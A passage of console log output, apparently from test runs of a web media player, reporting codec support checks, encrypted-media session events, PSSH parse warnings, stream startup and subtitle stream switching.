'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n....\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\n..\nWARN: 'Non-PSSH box found!'\nWARN: 'Non-PSSH box found!'\nWARN: 'Non-PSSH box found!'\n..\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\nWARN: 'PSSH parse failure!  Some data may be missing or incorrect.'\n.\nWARN: 'Non-PSSH box found!'\n.\nINFO: 'Using native Promises.'\nINFO: 'Using native EME as-is.'\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 25\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 25\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 25\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n..........................\nINFO: 'Using native Promises.'\nINFO: 'Using native EME as-is.'\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 599, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: null, timestampOffset: 0, bandwidth: 0, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 609, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: null, timestampOffset: 0, bandwidth: 0, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 620, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 633, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Switching stream to', {uniqueId: 634, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: null}, segmentInitSource: null, id: '20', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 646, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Switching stream to', {uniqueId: 647, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: null}, segmentInitSource: null, id: '20', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 659, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Switching stream to', {uniqueId: 659, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Switching stream to', {uniqueId: 660, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: null}, segmentInitSource: null, id: '20', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 